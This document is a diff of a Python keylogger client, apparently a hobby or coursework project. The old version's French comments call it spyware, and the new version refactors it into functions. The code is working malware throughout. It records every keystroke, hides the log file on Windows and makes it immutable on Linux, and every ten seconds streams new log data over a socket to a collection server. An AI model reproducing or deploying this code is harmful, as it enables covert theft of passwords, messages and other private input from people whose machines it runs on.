@@ -1,106 +1,82 @@
-import socket
-import logging
+import socket, logging, datetime, time, os, ctypes, io, platform
 from pynput.keyboard import Key, Listener
-import datetime
-import time
-import os
-import ctypes
-import io
-import platform
 
-# Paramètres du client
-host = 'localhost'
-port = 9809
 
-# Obtenir la date et l'heure pour le nom du fichier log
-current_time = datetime.datetime.today().strftime('%Y-%m-%d %Hh')
+# Function to get the operating system of the client
+def get_os():
+    return platform.system()
 
-# Obtenir l'adresse IP de l'host pour le nom du fichier log
-ip = str(socket.gethostbyname(socket.gethostname()))
 
-# Création du fichier log
-filename = f'{ip} - {current_time} - keyboard.txt'
+# Function to configure the logging file
+def setup_logging_file(filename):
+    logging.basicConfig(
+        filemode='a',
+        filename=filename,
+        datefmt='%d/%m/20%y %I:%M:%S',
+        format='%(asctime)s %(message)s',
+        level=logging.DEBUG
+    )
 
-# Configurer le fichier log pour enregistrer les touches pressées
-logging.basicConfig(
-    filemode='a',
-    filename=filename,
-    datefmt='%d/%m/20%y %I:%M:%S',
-    format='%(asctime)s %(message)s',
-    level=logging.DEBUG
-)
+# Function to hide the file
+def hide_file(filename):
+    if get_os() == 'Windows':
+        if not os.path.exists(filename):
+            open(filename, 'a').close()
+        ctypes.windll.kernel32.SetFileAttributesW(filename, 2)
+    elif get_os() == 'Linux':
+        os.system(f'chmod 777 {filename}')
+        os.system(f'chattr +i {filename}')
 
-# Si le système d'exploitation c'est Windows, mettre l'attribut hidden au fichier log
-if platform.system() == 'Windows':
-    if not os.path.exists(filename):
-        open(filename, 'a').close()
-    ctypes.windll.kernel32.SetFileAttributesW(filename, 2)
-
-# Fonction appelée quand une touche est pressée
-def on_press(key):
+# Function to log the key pressed
+def listen_keyboard(key):
     logging.info(str(key))
 
-# mettre la position de lecture à 0
-last_read_position = 0
-
-# Durée de la capture en secondes (10 minutes)
-capture_duration = 600
-
-# Enregistrer l'heure de début de la capture
-start_time = time.time()
-
-# Delais entre les envois de log
-delay_send_log = 10
-
-# Variable pour le système que si le serveur est injoignable le spyware capture pendant 10 minutes
-server_unreachable_message_displayed = False
-
-with Listener(on_press=on_press) as listener:
+# Function to send the log file to the server
+def send_log_file(filename, host, port, last_position):
     try:
-        while time.time() - start_time < capture_duration:
-            time.sleep(delay_send_log)
+        with socket.create_connection((host, port)) as sock:
+            filename_size = len(filename)
+            sock.send(filename_size.to_bytes(4, 'big'))
+            sock.send(filename.encode())
+            with open(filename, 'rb') as file:
+                file.seek(last_position)
+                file_data = file.read(1024)
+                while file_data:
+                    sock.send(file_data)
+                    file_data = file.read(1024)
+                last_position = file.tell()
+        print(f"Log file sent")
+        return last_position
+    except socket.error:
+        print('Server unreachable ! The log file will be sent later')
+        return last_position
 
-            # Désactiver temporairement l'écouteur
+# Function to start the listener
+def start_listener(filename, host, port, capture_duration, delay_send_log, last_position, start_time):
+    with Listener(on_press=listen_keyboard) as listener:
+        try:
+            while time.time() - start_time < capture_duration:
+                time.sleep(delay_send_log)
+                listener.stop()
+                last_position = send_log_file(filename, host, port, last_position)
+                listener = Listener(on_press=listen_keyboard)
+                listener.start()
+        except KeyboardInterrupt:
             listener.stop()
 
-            try:
-                client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                client_socket.connect((host, port))
-                
-        
-                # Envoyer la taille du nom du fichier
-                filename_size = len(filename)
-                client_socket.send(filename_size.to_bytes(4, 'big'))
+def main():
+    host = 'localhost'
+    port = 9809
+    current_time = datetime.datetime.today().strftime('%Y-%m-%d %Hh')
+    ip = str(socket.gethostbyname(socket.gethostname()))
+    filename = f'{ip} - {current_time} - keyboard.txt'
+    setup_logging_file(filename)
+    hide_file(filename)
+    last_position = 0
+    capture_duration = 600
+    start_time = time.time()
+    delay_send_log = 10
+    start_listener(filename, host, port, capture_duration, delay_send_log, last_position, start_time)
 
-                # Envoyer le nom du fichier de log au serveur
-                client_socket.send(filename.encode())
-
-                # Lire le contenu du fichier de log et l'envoyer au serveur
-                with open(filename, 'rb') as file:
-                    # Se déplacer à la position de lecture enregistrée dans la variable
-                    file.seek(last_read_position)
-                    file_data = file.read(1024)  # Lire par blocs de 1024 octets
-                    while file_data:
-                        client_socket.send(file_data)
-                        file_data = file.read(1024)
-
-                    # Enregistrer la position de lecture pour le prochain tour
-                    last_read_position = file.tell()
-
-                print(f"Fichier de log envoyé")
-                client_socket.close()
-
-            # Gestion si le serveur est injoignable
-            except socket.error:
-                if not server_unreachable_message_displayed:
-                    print('Serveur injoignable. Temps restant de capture 10 minutes')
-                    server_unreachable_message_displayed = True
-
-                    # Réinitialiser l'heure de début de la capture à l'heure actuelle
-                    start_time = time.time()
-
-            # Réactiver l'écouteur
-            listener = Listener(on_press=on_press)
-            listener.start()
-    except KeyboardInterrupt:
-        listener.stop()
+if __name__ == '__main__':
+    main()
